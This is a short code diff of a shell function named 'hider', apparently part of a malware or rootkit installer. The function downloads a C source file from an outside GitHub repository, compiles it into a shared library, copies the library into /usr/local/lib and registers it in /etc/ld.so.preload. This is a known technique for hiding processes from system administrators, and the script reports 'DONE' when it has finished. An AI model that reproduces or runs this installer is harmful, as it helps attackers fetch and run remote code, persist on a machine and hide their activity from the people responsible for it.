@@ -1,15 +1,18 @@
 function hider() {
     
     if [[ -f /usr/bin/gcc ]] ; then
-	    wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/prhid.c 1>/dev/null ;
-	    gcc -Wall -fPIC -shared -o libprhid.so prhid.c -ldl 1>/dev/null ;
+        wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/prhid.c 1>/dev/null ;
+	gcc -Wall -fPIC -shared -o libprhid.so prhid.c -ldl 1>/dev/null ;
+	mv libprhid.so /usr/local/lib/;
+    	echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload ;
     else
         apt install gcc -y 1>/dev/null ;
         wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/prhid.c ;
-	    gcc -Wall -fPIC -shared -o libprhid.so prhid.c -ldl 1>/dev/null ;
+	gcc -Wall -fPIC -shared -o libprhid.so prhid.c -ldl 1>/dev/null ;
+     	mv libprhid.so /usr/local/lib/;
+    	echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload ;
     fi
-    mv libprhid.so /usr/local/lib/;
-    echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload ;
+    
     if [[ -f /usr/local/lib/libprhid.so && -f /etc/ld.so.preload ]] ;
         then printf "%-20s %20s\n" " hidesetup" "[  DONE  ]" ;
     else printf "%-20s %20s\n" " hidesetup" "[  FAILED  ]" ;
